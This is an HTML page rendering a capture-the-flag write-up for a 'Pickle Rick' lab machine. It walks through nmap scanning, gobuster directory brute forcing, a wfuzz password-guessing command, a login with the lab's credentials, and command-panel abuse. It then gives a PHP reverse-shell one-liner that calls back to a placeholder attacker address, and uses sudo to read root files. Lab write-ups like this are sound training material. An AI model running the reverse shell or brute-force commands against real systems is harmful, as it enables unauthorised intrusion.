<!DOCTYPE html>
<html lang="en" data-bs-theme="light">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        
        
        <link rel="shortcut icon" href="../../../img/favicon.ico">
        <title>Optional but useful: - My Docs</title>
        <link href="../../../css/bootstrap.min.css" rel="stylesheet">
        <link href="../../../css/fontawesome.min.css" rel="stylesheet">
        <link href="../../../css/brands.min.css" rel="stylesheet">
        <link href="../../../css/solid.min.css" rel="stylesheet">
        <link href="../../../css/v4-font-face.min.css" rel="stylesheet">
        <link href="../../../css/base.css" rel="stylesheet">
        <link id="hljs-light" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" >
        <link id="hljs-dark" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github-dark.min.css" disabled>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
        <script>hljs.highlightAll();</script> 
    </head>

    <body>
        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
            <div class="container">
                <a class="navbar-brand" href="../../..">My Docs</a>
                <!-- Expander button -->
                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>

                <!-- Expanded navigation -->
                <div id="navbar-collapse" class="navbar-collapse collapse">
                        <!-- Main navigation -->
                        <ul class="nav navbar-nav">
                            <li class="nav-item">
                                <a href="../../.." class="nav-link">Welcome to MkDocs</a>
                            </li>
                            <li class="nav-item dropdown">
                                <a href="#" class="nav-link dropdown-toggle active" aria-current="page" role="button" data-bs-toggle="dropdown"  aria-expanded="false">Easy</a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">Pickle rick</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="./" class="dropdown-item active" aria-current="page">Optional but useful:</a>
</li>
    </ul>
  </li>
                                </ul>
                            </li>
                        </ul>

                    <ul class="nav navbar-nav ms-md-auto">
                        <li class="nav-item">
                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
                                <i class="fa fa-search"></i> Search
                            </a>
                        </li>
                            <li class="nav-item">
                                <a rel="prev" href="../../.." class="nav-link">
                                    <i class="fa fa-arrow-left"></i> Previous
                                </a>
                            </li>
                            <li class="nav-item">
                                <a rel="next" class="nav-link disabled">
                                    Next <i class="fa fa-arrow-right"></i>
                                </a>
                            </li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="container">
            <div class="row">
                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
    <div class="navbar-header">
        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
            <span class="fa fa-angle-down"></span>
        </button>
    </div>

    
    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
        <ul class="nav flex-column">
            
            <li class="nav-item" data-bs-level="1"><a href="#optional-but-useful" class="nav-link">Optional but useful:</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            
            <li class="nav-item" data-bs-level="1"><a href="#reconnaissance" class="nav-link">Reconnaissance</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            
            <li class="nav-item" data-bs-level="1"><a href="#enumeration" class="nav-link">Enumeration</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            
            <li class="nav-item" data-bs-level="1"><a href="#conclusion" class="nav-link">Conclusion</a>
              <ul class="nav flex-column">
              </ul>
            </li>
        </ul>
    </div>
</div></div>
                    <div class="col-md-9" role="main">

<h1 id="optional-but-useful">Optional but useful:</h1>
<p>When starting the machine, I got the IP and put it in hosts. To make it more efficient at getting to the site. IP: 10.10.108.239; host: rick.thm.</p>
<h1 id="reconnaissance">Reconnaissance</h1>
<p>An important step in web enumeration is to get the nmap scan.</p>
<p><img alt="namp_scan" src="../assets/nmap_scan.png" /></p>
<p>After seeing port: 80 (http port), we know there is a website involved. We also need to note that port: 22 (ssh port) is also open, which means we can possibly gain root access.</p>
<p>After going to the website, we see this</p>
<p><img alt="home_scree" src="../assets/home_screen.png" /></p>
<p>We now know our goal, which is to find the last three secret ingredients to change Rick back into a person.</p>
<h1 id="enumeration">Enumeration</h1>
<p>After digging deeper, you can see in the inspect element the username.</p>
<p><img alt="user_name" src="../assets/user_name.png" /></p>
<p>Username: R1ckRul3s</p>
<p>Very useful information; now we know there has to be some type of login page for this.</p>
<p>Knowing that a new page is needed using a fuzzing tool or directory brute forcing tool. The one I used was "gobsuter." Knowing we need to find a different page I used the payload of</p>
<p><code>gobuster dir -u http://rick.thm -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php</code></p>
<p>Got the results of:</p>
<p><img alt="gobuster_result" src="../assets/gobuster_result.png" /></p>
<p>After looking at the results, one stands out the most. Login.php is most likely the page we are looking for.</p>
<p>Another page that wasn't listed was robots.txt (which is used for web scrapping); most websites have it. When looking at it, it only has Wubbalubbadubdub; maybe it has a significance.</p>
<p><img alt="password" src="../assets/password.png" /></p>
<p>When using not knowing the password, you can try to brute force the password. Since we already know that the user name is "R1ckRul3s" it cuts down on how long it will take to find the password. After running</p>
<p><code>wfuzz -c -z file,apache-user-enum-2.0.txt --hw 61 -d "username=R1ckRul3s&amp;password=FUZZ" http://rick.thm/login.php</code></p>
<p>The response was this:</p>
<p><img alt="failed_fuzz" src="../assets/failed_fuzz.png" /></p>
<p>Although that random word in Robots.txt might be the password. And bingo, that was the password, and now we are on the portal.php page. So the username and password was R1ckRul3s, Wubbalubbadubdub.</p>
<p><img alt="portal" src="../assets/protal.png" /></p>
<p>After looking around in the different tabs, it looks like we only have access to the commands section.</p>
<p><img alt="denied" src="../assets/denied.png" /></p>
<p>This command panel might be what we need for the first ingredient. When you run 'ls' in the panel, it shows what is in the directory.</p>
<p><img alt="dir1" src="../assets/dir1.png" /></p>
<p>When trying to read the file, it looks like we can't use the cat command. It is important to note that we are the user www-data. After multiple different commands to read the file, I found that the 'less' command works. Running</p>
<p><code>less Sup3rS3cretPickl3Ingred.txt</code></p>
<p>We get the first ingredient. Now we need to find the next two to help Rick turn back to normal. Looking back on the first directory, there is a text file named clue. Running the less command on the clue.txt says "Look around the file system for the other ingredient.".</p>
<p>After running pwd, we see that we are in the /var/www/html file path. We are not able to change the directory using cd, which means that we have to traverse the file system via the 'ls' command.</p>
<p>After looking, there is a file named "second ingredients" when running:
<code>ls ../../../home/rick/</code></p>
<p>Instead of using the command panel, we can run a reverse PHP shell, which allowed access to the www-data user via the command line.
Payload:
    <code>php -r '$sock=fsockopen("[MACHINE IP]",[PORT NUMBER]);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></p>
<p>Now we can use all of the commands that this user can do. Which also means that the website had some client-side filiters.</p>
<p>When running: <code>cat "second ingredients"</code> we get the second ingredient. It is required to have quotations around the second ingredients, since the command line thinks it is two different things. Now on to the third and final ingredient.</p>
<p>Most likely, the final ingredient would be in the root directory. When trying to ls the directory, there is an error saying we don't have the permissions. Although we can try the sudo command to get permission. Running: <code>sudo ls -la root</code> we see that 3rd.txt is in the root directory.</p>
<p>We now need to run the less command to see the file: <code>sudo less root/3rd.txt</code>. It works! The third and final ingredient was found, and Rick is now back to a normal person.</p>
<h1 id="conclusion">Conclusion</h1>
<p>At the beginning, using nmap to see the open ports and using gobuster to find the directories. We were able to gain access to the login page. Using the command panel to get the first ingredient, then using a PHP reverse shell to gain access to the machine. Finding the second ingredient in <code>/home/rick/</code>. Finally, finding the last indgredient in <code>/root/3rd.txt</code> using sudo to gain permission.</p></div>
            </div>
        </div>

        <footer class="col-md-12">
            <hr>
            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
        </footer>
        <script src="../../../js/bootstrap.bundle.min.js"></script>
        <script>
            var base_url = "../../..",
                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
        </script>
        <script src="../../../js/base.js"></script>
        <script src="../../../search/main.js"></script>

        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title" id="searchModalLabel">Search</h4>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <p>From here you can search these documents. Enter your search terms below.</p>
                <form>
                    <div class="form-group">
                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
                    </div>
                </form>
                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
            </div>
            <div class="modal-footer">
            </div>
        </div>
    </div>
</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
              <table class="table">
                <thead>
                  <tr>
                    <th style="width: 20%;">Keys</th>
                    <th>Action</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td class="help shortcut"><kbd>?</kbd></td>
                    <td>Open this help</td>
                  </tr>
                  <tr>
                    <td class="next shortcut"><kbd>n</kbd></td>
                    <td>Next page</td>
                  </tr>
                  <tr>
                    <td class="prev shortcut"><kbd>p</kbd></td>
                    <td>Previous page</td>
                  </tr>
                  <tr>
                    <td class="search shortcut"><kbd>s</kbd></td>
                    <td>Search</td>
                  </tr>
                </tbody>
              </table>
            </div>
            <div class="modal-footer">
            </div>
        </div>
    </div>
</div>

    </body>
</html>
